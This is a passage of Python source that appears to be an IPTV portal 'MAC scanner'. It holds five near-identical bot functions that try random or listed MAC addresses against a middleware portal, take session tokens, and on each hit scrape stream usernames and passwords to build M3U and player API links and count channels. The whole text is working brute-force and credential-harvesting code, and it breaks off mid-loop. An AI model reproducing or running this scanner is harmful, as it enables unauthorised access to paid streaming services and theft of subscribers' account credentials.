                                port=port.split(',')[0]
                                port=port.replace('"',"")
                                
                                userm=veri.split('username":')[1]
                                userm=userm.split(',')[0]
                                userm=userm.replace('"',"")
                                
                                
                                pasm=veri.split('password":')[1]
                                pasm=pasm.split(',')[0]
                                pasm=pasm.replace('"',"")
                                
                                bitism=""
                                bitism=veri.split('exp_date":')[1]
                                bitism=bitism.split(',')[0]
                                bitism=bitism.replace('"',"")
                                
                                message=veri.split('message":"')[1].split(',')[0].replace('"','')
                                
                                
                                if bitism=="null":
                                        bitism="Unlimited"
                                else:
                                        bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
                                
                                mt=("""
╭─➤ 🆇🆃🆁🅴🅰🅼🌎🅸🅽🅵🅾
├●🔸🌐Host ➤ http://"""+panel+""""""+str(uzmanm2)+""""""+str(buri)+"""
├●🔸📡Port ➤ """+port+"""
├●♦️👩‍User ➤ """+userm+"""
├●♦️🔑Pass ➤ """+pasm+"""
├─●🔸📆Exp ➤ """+bitism+""" 
├──●🔸👩ActCon ➤ """+acon+"""
├──●🔸👪MaxCon ➤ """+mcon+""" 
╰───●🔸🌐Status ➤ """+status+""" """)
        

        except:pass
        return mt
                        
                        
def d1():
        global hitc
        global hitr
        global tokenr
        for mac in range(1,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_01"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break

                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])

                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))
                                                                                        
                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)

                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)




def d2():
        global hitc
        global hitr
        global tokenr
        for mac in range(2,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_02"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))
                                                                                        
                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d3():
        global hitc
        global hitr
        global tokenr
        for mac in range(3,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_03"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))
                                                                                        
                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)


def d4():
        global hitc
        global hitr
        global tokenr
        for mac in range(4,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_04"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))
                                                                                        
                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d5():
        global hitc
        global hitr
        global tokenr
        for mac in range(5,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_05"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
